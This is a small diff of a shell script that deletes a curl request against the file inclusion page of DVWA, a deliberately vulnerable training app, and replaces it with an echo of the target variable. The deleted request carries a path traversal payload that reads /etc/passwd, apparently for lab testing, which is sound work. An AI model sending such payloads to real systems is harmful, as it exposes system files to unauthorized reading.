@@ -1,4 +1,1 @@
-curl -sS -i --max-time 15 --get \
-  "$DVWA/vulnerabilities/fi/" \
-  --data-urlencode 'page=../../../../../etc/passwd' \
-  --data 'bookcase=book05-path'
+echo "$DVWA"
